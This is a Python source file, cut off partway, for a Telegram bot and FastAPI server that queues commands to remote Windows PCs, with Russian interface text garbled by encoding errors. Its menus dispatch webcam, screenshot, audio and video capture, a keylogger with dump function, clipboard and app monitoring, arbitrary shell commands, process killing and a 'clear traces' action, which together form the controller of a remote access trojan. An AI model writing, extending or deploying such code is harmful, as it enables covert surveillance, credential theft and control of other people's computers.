from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters
)
import sqlite3
import logging
import uvicorn
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse
from threading import Thread
import socket
import requests
import base64
import os
from datetime import datetime
from collections import defaultdict
import tempfile
import cv2
import numpy as np
import shutil
from fastapi.staticfiles import StaticFiles
import uuid

bot_instance = None

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

DATABASE = 'pc_control.db'
API_PORT = 4443
ADMIN_IDS = [5276367440]

api = FastAPI()

UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
api.mount("/downloads", StaticFiles(directory=UPLOAD_FOLDER), name="downloads")
upload_progress = defaultdict(dict)

def is_port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(('localhost', port)) == 0

class ServerBot:
    def __init__(self, token):
        self.token = token
        self.application = ApplicationBuilder().token(self.token).build()
        self.setup_handlers()
        self.init_db()

    def init_db(self):
        with sqlite3.connect(DATABASE) as conn:
            c = conn.cursor()
            c.execute('''CREATE TABLE IF NOT EXISTS devices
                        (device_id TEXT PRIMARY KEY,
                         name TEXT,
                         ip TEXT,
                         os TEXT,
                         last_seen TIMESTAMP,
                         is_online INTEGER DEFAULT 0)''')
            
            c.execute('''CREATE TABLE IF NOT EXISTS users
                        (user_id INTEGER PRIMARY KEY,
                         username TEXT)''')
            
            c.execute('''CREATE TABLE IF NOT EXISTS commands
                        (id INTEGER PRIMARY KEY AUTOINCREMENT,
                         device_id TEXT,
                         command TEXT,
                         status TEXT DEFAULT 'pending',
                         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')

    def setup_handlers(self):
        self.application.add_handlers([
            CommandHandler("start", self.start_command),
            CommandHandler("devices", self.list_devices_command),
            CallbackQueryHandler(self.callback_handler),
            MessageHandler(filters.TEXT & (~filters.COMMAND), self.text_message_handler),
            MessageHandler(filters.PHOTO, self.photo_message_handler)
        ])

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await update.message.reply_text("‚õî –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω")
            return
            
        with sqlite3.connect(DATABASE) as conn:
            conn.execute("INSERT OR IGNORE INTO users VALUES (?, ?)", 
                       (user_id, update.effective_user.username))
        
        keyboard = [
            [InlineKeyboardButton("üìã –°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤", callback_data="list_devices")],
            [InlineKeyboardButton("üîÑ –û–±–Ω–æ–≤–∏—Ç—å —Å—Ç–∞—Ç—É—Å", callback_data="refresh_devices")]
        ]
        
        await update.message.reply_text(
            "üñ•Ô∏è –ü–∞–Ω–µ–ª—å —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ü–ö",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    async def list_devices_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await update.message.reply_text("‚õî –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω")
            return
            
        await self.show_devices_list(update.effective_chat.id)

    async def show_devices_list(self, chat_id):
        with sqlite3.connect(DATABASE) as conn:
            # –û–±–Ω–æ–≤–∏—Ç—å —Å—Ç–∞—Ç—É—Å—ã: –µ—Å–ª–∏ last_seen > 2 –º–∏–Ω –Ω–∞–∑–∞–¥, is_online=0
            conn.execute("UPDATE devices SET is_online=0 WHERE last_seen < datetime('now', '-120 seconds')")
            c = conn.cursor()
            c.execute("SELECT device_id, name, ip, last_seen FROM devices")
            devices = c.fetchall()
        now = datetime.now()
        online_devices = []
        for device_id, name, ip, last_seen in devices:
            try:
                last_seen_dt = datetime.strptime(last_seen, "%Y-%m-%d %H:%M:%S")
            except Exception:
                last_seen_dt = now
            is_online = (now - last_seen_dt).total_seconds() < 120
            online_devices.append((device_id, name, ip, is_online))
        if not online_devices:
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–ù–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤"
            )
            return
        keyboard = [
            [InlineKeyboardButton(
                f"{'üü¢' if is_online else 'üî¥'} {name} ({ip})",
                callback_data=f"device_{device_id}"
            )]
            for device_id, name, ip, is_online in online_devices
        ]
        keyboard.append([InlineKeyboardButton("üîÑ –û–±–Ω–æ–≤–∏—Ç—å", callback_data="refresh_devices")])
        await self.application.bot.send_message(
            chat_id=chat_id,
            text="–°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
            
    async def callback_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        if query.data == "list_devices":
            await self.show_devices_list(query.message.chat_id)
        elif query.data == "refresh_devices":
            await self.refresh_devices(query.message.chat_id)
        elif query.data.startswith("device_"):
            await self.handle_device_action(query.message.chat_id, query.data[7:])
        elif query.data.startswith("action_"):
            parts = query.data.split("_")
            device_id = parts[1]
            action = "_".join(parts[2:])
            await self.handle_device_action_command(query.message.chat_id, device_id, action, context)
        elif query.data == "back_to_devices":
            await self.show_devices_list(query.message.chat_id)

    async def text_message_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            return
        if 'show_message_device' in context.user_data:
            device_id = context.user_data.pop('show_message_device')
            text = update.message.text
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command, status, created_at) VALUES (?, ?, 'pending', CURRENT_TIMESTAMP)",
                             (device_id, f"show_message:{text}"))
            await update.message.reply_text(f"–ö–æ–º–∞–Ω–¥–∞ '–ü–æ–∫–∞–∑–∞—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ' –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤—É. –û–∂–∏–¥–∞–π—Ç–µ...")
            await self.show_devices_list(update.effective_chat.id)
        elif 'hotkey_device' in context.user_data:
            device_id = context.user_data.pop('hotkey_device')
            hotkey = update.message.text.strip().lower()
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, f"hotkey:{hotkey}"))
            await update.message.reply_text(f"–ö–æ–º–∞–Ω–¥–∞ 'hotkey {hotkey}' –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤—É. –û–∂–∏–¥–∞–π—Ç–µ...")
            await self.show_devices_list(update.effective_chat.id)
        elif 'cmd_device' in context.user_data:
            device_id = context.user_data.pop('cmd_device')
            cmd = update.message.text.strip()
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, f"cmd:{cmd}"))
            await update.message.reply_text(f"–ö–æ–º–∞–Ω–¥–∞ 'cmd {cmd}' –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤—É. –û–∂–∏–¥–∞–π—Ç–µ...")
            await self.show_devices_list(update.effective_chat.id)
        elif 'killprocess_device' in context.user_data:
            device_id = context.user_data.pop('killprocess_device')
            proc = update.message.text.strip()
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, f"killprocess:{proc}"))
            await update.message.reply_text(f"–ö–æ–º–∞–Ω–¥–∞ 'killprocess {proc}' –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤—É. –û–∂–∏–¥–∞–π—Ç–µ...")
            await self.show_devices_list(update.effective_chat.id)
        elif 'video_multi_device' in context.user_data:
            device_id = context.user_data.pop('video_multi_device')
            try:
                count = int(update.message.text.strip())
                if count < 1 or count > 10:
                    raise ValueError
            except Exception:
                await update.message.reply_text("–í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ –æ—Ç 1 –¥–æ 10!")
                context.user_data['video_multi_device'] = device_id
                return
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, f"record_video_multi:{count}"))
            await update.message.reply_text(f"–ö–æ–º–∞–Ω–¥–∞ '–ú—É–ª—å—Ç–∏–∑–∞–ø–∏—Å—å –≤–∏–¥–µ–æ x{count}' –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤—É. –û–∂–∏–¥–∞–π—Ç–µ...")
            await self.show_devices_list(update.effective_chat.id)
        elif 'block_site_device' in context.user_data:
            device_id = context.user_data.pop('block_site_device')
            url = update.message.text.strip()
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, f"block_site:{url}"))
            await update.message.reply_text(f"–°–∞–π—Ç {url} –±—É–¥–µ—Ç –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω.")
            await self.show_devices_list(update.effective_chat.id)
        elif 'block_app_device' in context.user_data:
            device_id = context.user_data.pop('block_app_device')
            name = update.message.text.strip()
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, f"block_app:{name}"))
            await update.message.reply_text(f"–ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ {name} –±—É–¥–µ—Ç –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–æ (–∑–∞–≤–µ—Ä—à–µ–Ω–æ).")
            await self.show_devices_list(update.effective_chat.id)

    async def photo_message_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            return
        if 'open_image_device' in context.user_data:
            device_id = context.user_data.pop('open_image_device')
            photo = update.message.photo[-1]
            file = await photo.get_file()
            file_bytes = await file.download_as_bytearray()
            img_b64 = base64.b64encode(file_bytes).decode('utf-8')
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, f"open_image:{img_b64}"))
            await update.message.reply_text("–ö–æ–º–∞–Ω–¥–∞ '–û—Ç–∫—Ä—ã—Ç—å –∫–∞—Ä—Ç–∏–Ω–∫—É' –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤—É. –û–∂–∏–¥–∞–π—Ç–µ...")
            await self.show_devices_list(update.effective_chat.id)

    async def refresh_devices(self, chat_id):
        await self.application.bot.send_message(
            chat_id=chat_id,
            text="üîÑ –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å—Ç–∞—Ç—É—Å–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤..."
        )
        await self.show_devices_list(chat_id)

    async def handle_device_action(self, chat_id, device_id):
        with sqlite3.connect(DATABASE) as conn:
            c = conn.cursor()
            c.execute("SELECT name, is_online FROM devices WHERE device_id=?", (device_id,))
            device = c.fetchone()
        
        if not device:
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ"
            )
            return
            
        name, is_online = device
        
        if is_online:
            keyboard = [
                [InlineKeyboardButton("üì∑ –ú—É–ª—å—Ç–∏–º–µ–¥–∏–∞", callback_data=f"action_{device_id}_media_menu")],
                [InlineKeyboardButton("üíª –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ", callback_data=f"action_{device_id}_control_menu")],
                [InlineKeyboardButton("‚öôÔ∏è –°–∏—Å—Ç–µ–º–∞", callback_data=f"action_{device_id}_system_menu")],
                [
                    InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data="back_to_devices"),
                    InlineKeyboardButton("üè† –ì–ª–∞–≤–Ω–æ–µ", callback_data="back_to_devices")
                ]
            ]
            
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=f"–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ–º: {name}\n–°—Ç–∞—Ç—É—Å: –æ–Ω–ª–∞–π–Ω",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=f"–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ {name} –≤ –Ω–∞—Å—Ç–æ—è—â–µ–µ –≤—Ä–µ–º—è –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data="back_to_devices")]]
                ))

    async def handle_device_action_command(self, chat_id, device_id, action, context):
        if action == "media_menu":
            keyboard = [
                [InlineKeyboardButton("üñºÔ∏è –°–∫—Ä–∏–Ω—à–æ—Ç", callback_data=f"action_{device_id}_screenshot")],
                [InlineKeyboardButton("üì∏ –í–µ–±-–∫–∞–º–µ—Ä–∞", callback_data=f"action_{device_id}_webcam")],
                [InlineKeyboardButton("üé• –ó–∞–ø–∏—Å—å –≤–∏–¥–µ–æ (10 —Å–µ–∫)", callback_data=f"action_{device_id}_record_video_10")],
                [InlineKeyboardButton("üé• –ú—É–ª—å—Ç–∏–∑–∞–ø–∏—Å—å –≤–∏–¥–µ–æ", callback_data=f"action_{device_id}_record_video_multi")],
                [InlineKeyboardButton("üé§ –ó–∞–ø–∏—Å—å –∑–≤—É–∫–∞ (10 —Å–µ–∫)", callback_data=f"action_{device_id}_record_audio_10")],
                [InlineKeyboardButton("üñºÔ∏è –û—Ç–∫—Ä—ã—Ç—å –∫–∞—Ä—Ç–∏–Ω–∫—É", callback_data=f"action_{device_id}_open_image")],
                [InlineKeyboardButton("üîä +10%", callback_data=f"action_{device_id}_volume_up_10")],
                [InlineKeyboardButton("üîâ -10%", callback_data=f"action_{device_id}_volume_down_10")],
                [InlineKeyboardButton("üîá Mute", callback_data=f"action_{device_id}_volume_mute")],
                [
                    InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"device_{device_id}"),
                    InlineKeyboardButton("üè† –ì–ª–∞–≤–Ω–æ–µ", callback_data="back_to_devices")
                ]
            ]
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–ú—É–ª—å—Ç–∏–º–µ–¥–∏–∞ —Ñ—É–Ω–∫—Ü–∏–∏:",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        elif action == "record_video_multi":
            # –ó–∞–ø—Ä–æ—Å–∏—Ç—å —É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –≤–∏–¥–µ–æ
            context.user_data['video_multi_device'] = device_id
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –≤–∏–¥–µ–æ –¥–ª—è –∑–∞–ø–∏—Å–∏ (–ø–æ 10 —Å–µ–∫ –∫–∞–∂–¥–æ–µ):"
            )
        elif action.startswith("record_video_multi_"):
            # –ü—Ä–∏–Ω—è—Ç—å —á–∏—Å–ª–æ –∏ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–º–∞–Ω–¥—É
            count = action.split('_')[-1]
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, f"record_video_multi:{count}"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=f"–ö–æ–º–∞–Ω–¥–∞ '–ú—É–ª—å—Ç–∏–∑–∞–ø–∏—Å—å –≤–∏–¥–µ–æ x{count}' –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤—É. –û–∂–∏–¥–∞–π—Ç–µ...",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"device_{device_id}")]
                ]))
        elif action == "windows_menu":
            # –ü–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ –æ–∫–æ–Ω
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "list_windows"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–ö–æ–º–∞–Ω–¥–∞ '–ü–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ –æ–∫–æ–Ω' –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤—É. –û–∂–∏–¥–∞–π—Ç–µ...",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"device_{device_id}")]
                ]))
        elif action.startswith("window_action_"):
            # window_action_{hwnd}_{act}
            parts = action.split('_')
            hwnd = parts[2]
            act = parts[3]
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, f"window_action:{hwnd}:{act}"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=f"–ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –æ–∫–Ω–∞ {hwnd} ({act}) –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤—É.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"device_{device_id}")]
                ]))
        elif action == "system_info":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "system_info"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–ö–æ–º–∞–Ω–¥–∞ '–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ' –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤—É. –û–∂–∏–¥–∞–π—Ç–µ...",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"device_{device_id}")]
                ]))
        elif action == "volume_up_10":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "volume_up_10"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–ö–æ–º–∞–Ω–¥–∞ '–ì—Ä–æ–º–∫–æ—Å—Ç—å +10%' –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤—É.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"device_{device_id}")]
                ]))
        elif action == "volume_down_10":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "volume_down_10"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–ö–æ–º–∞–Ω–¥–∞ '–ì—Ä–æ–º–∫–æ—Å—Ç—å -10%' –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤—É.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"device_{device_id}")]
                ]))
        elif action == "volume_mute":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "volume_mute"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–ö–æ–º–∞–Ω–¥–∞ 'Mute' –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤—É.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"device_{device_id}")]
                ]))
        elif action == "control_menu":
            keyboard = [
                [InlineKeyboardButton("üñ±Ô∏è –ö–ª–∏–∫ –º—ã—à–∏", callback_data=f"action_{device_id}_mouse_click")],
                [InlineKeyboardButton("üî£ –ö–æ–º–±–∏–Ω–∞—Ü–∏—è –∫–ª–∞–≤–∏—à", callback_data=f"action_{device_id}_hotkey_menu")],
                [InlineKeyboardButton("üì∫ –í—ã–≤–µ—Å—Ç–∏ —Å–æ–æ–±—â–µ–Ω–∏–µ", callback_data=f"action_{device_id}_show_message")],
                [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"device_{device_id}")]
            ]
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–§—É–Ω–∫—Ü–∏–∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è:",
                reply_markup=InlineKeyboardMarkup(keyboard))
        elif action == "hotkey_menu":
            keyboard = [
                [InlineKeyboardButton("Alt+F4", callback_data=f"action_{device_id}_hotkey:alt+f4")],
                [InlineKeyboardButton("Ctrl+Alt+Del", callback_data=f"action_{device_id}_hotkey:ctrl+alt+delete")],
                [InlineKeyboardButton("Win+L", callback_data=f"action_{device_id}_hotkey:win+l")],
                [InlineKeyboardButton("Ctrl+Shift+Esc", callback_data=f"action_{device_id}_hotkey:ctrl+shift+esc")],
                [InlineKeyboardButton("–í–≤–µ—Å—Ç–∏ —Å–≤–æ—é –∫–æ–º–±–∏–Ω–∞—Ü–∏—é", callback_data=f"action_{device_id}_hotkey_custom")],
                [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"action_{device_id}_control_menu")]
            ]
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–í—ã–±–µ—Ä–∏—Ç–µ –∫–æ–º–±–∏–Ω–∞—Ü–∏—é –∫–ª–∞–≤–∏—à –∏–ª–∏ –≤–≤–µ–¥–∏—Ç–µ —Å–≤–æ—é:",
                reply_markup=InlineKeyboardMarkup(keyboard))
        elif action.startswith("hotkey:"):
            hotkey = action.split(":", 1)[1].lower()
            if hotkey in ["win+l", "win+L"]:
                with sqlite3.connect(DATABASE) as conn:
                    conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                                 (device_id, "lock"))
                await self.application.bot.send_message(
                    chat_id=chat_id,
                    text=f"–ö–æ–º–∞–Ω–¥–∞ '–ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ —ç–∫—Ä–∞–Ω–∞ (Win+L)' –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤—É. –û–∂–∏–¥–∞–π—Ç–µ...",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"action_{device_id}_hotkey_menu")]
                    ]))
            elif hotkey in ["ctrl+alt+delete", "ctrl+alt+del"]:
                await self.application.bot.send_message(
                    chat_id=chat_id,
                    text="–û—à–∏–±–∫–∞: Ctrl+Alt+Delete –Ω–µ–ª—å–∑—è —ç–º—É–ª–∏—Ä–æ–≤–∞—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ –≤ Windows.",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"action_{device_id}_hotkey_menu")]
                    ]))
            else:
                with sqlite3.connect(DATABASE) as conn:
                    conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                                 (device_id, f"hotkey:{hotkey}"))
                await self.application.bot.send_message(
                    chat_id=chat_id,
                    text=f"–ö–æ–º–∞–Ω–¥–∞ 'hotkey {hotkey}' –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤—É. –û–∂–∏–¥–∞–π—Ç–µ...",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"action_{device_id}_hotkey_menu")]
                    ]))
        elif action == "hotkey_custom":
            context.user_data['hotkey_device'] = device_id
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–í–≤–µ–¥–∏—Ç–µ —Å–≤–æ—é –∫–æ–º–±–∏–Ω–∞—Ü–∏—é –∫–ª–∞–≤–∏—à (–Ω–∞–ø—Ä–∏–º–µ—Ä: ctrl+shift+esc):")
        elif action == "system_menu":
            keyboard = [
                [InlineKeyboardButton("üìÅ –§–∞–π–ª—ã", callback_data=f"action_{device_id}_files_menu")],
                [InlineKeyboardButton("üíª –ö–æ–º–∞–Ω–¥–Ω–∞—è —Å—Ç—Ä–æ–∫–∞", callback_data=f"action_{device_id}_cmd_menu")],
                [InlineKeyboardButton("üìú –°–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤", callback_data=f"action_{device_id}_processes")],
                [InlineKeyboardButton("‚ùå –ó–∞–≤–µ—Ä—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å", callback_data=f"action_{device_id}_killprocess")],
                [InlineKeyboardButton("üîí –ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å", callback_data=f"action_{device_id}_lock")],
                [InlineKeyboardButton("üí§ –°–ø—è—â–∏–π —Ä–µ–∂–∏–º", callback_data=f"action_{device_id}_sleep")],
                [InlineKeyboardButton("üîå –í—ã–∫–ª—é—á–∏—Ç—å", callback_data=f"action_{device_id}_shutdown")],
                [InlineKeyboardButton("üîÑ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å", callback_data=f"action_{device_id}_reboot")],
                [InlineKeyboardButton("üìù –ö–µ–π–ª–æ–≥–≥–µ—Ä", callback_data=f"action_{device_id}_keylogger_menu")],
                [InlineKeyboardButton("üñ±Ô∏è –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –º—ã—à–∏", callback_data=f"action_{device_id}_mouse_menu")],
                [InlineKeyboardButton("üóî –û–∫–Ω–∞", callback_data=f"action_{device_id}_windows_menu")],
                [InlineKeyboardButton("üìã –ë—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞", callback_data=f"action_{device_id}_clipboard_monitor")],
                [InlineKeyboardButton("üóÇÔ∏è –ü—Ä–∏–ª–æ–∂–µ–Ω–∏—è", callback_data=f"action_{device_id}_apps_monitor")],
                [InlineKeyboardButton("üßπ –û—á–∏—Å—Ç–∏—Ç—å —Å–ª–µ–¥—ã", callback_data=f"action_{device_id}_clear_traces")],
                [InlineKeyboardButton("üö´ –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ —Å–∞–π—Ç–∞", callback_data=f"action_{device_id}_block_site")],
                [InlineKeyboardButton("üö´ –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è", callback_data=f"action_{device_id}_block_app")],
                [InlineKeyboardButton("üé§ –î–ª–∏—Ç–µ–ª—å–Ω–∞—è –∑–∞–ø–∏—Å—å –∞—É–¥–∏–æ", callback_data=f"action_{device_id}_audio_menu")],
                [
                    InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"device_{device_id}"),
                    InlineKeyboardButton("üè† –ì–ª–∞–≤–Ω–æ–µ", callback_data="back_to_devices")
                ]
            ]
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–°–∏—Å—Ç–µ–º–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏:",
                reply_markup=InlineKeyboardMarkup(keyboard))
        elif action == "keylogger_menu":
            keyboard = [
                [InlineKeyboardButton("‚ñ∂Ô∏è –°—Ç–∞—Ä—Ç", callback_data=f"action_{device_id}_keylogger_start")],
                [InlineKeyboardButton("‚èπÔ∏è –°—Ç–æ–ø", callback_data=f"action_{device_id}_keylogger_stop")],
                [InlineKeyboardButton("üì§ –í—ã–≥—Ä—É–∑–∏—Ç—å", callback_data=f"action_{device_id}_keylogger_dump")],
                [InlineKeyboardButton("üßπ –û—á–∏—Å—Ç–∏—Ç—å", callback_data=f"action_{device_id}_keylogger_clear")],
                [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"action_{device_id}_system_menu")]
            ]
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–ö–µ–π–ª–æ–≥–≥–µ—Ä:",
                reply_markup=InlineKeyboardMarkup(keyboard))
        elif action == "keylogger_start":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "keylogger_start"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="–ö–µ–π–ª–æ–≥–≥–µ—Ä –∑–∞–ø—É—â–µ–Ω.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data=f"action_{device_id}_keylogger_menu")]
                ]))
        elif action == "keylogger_stop":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
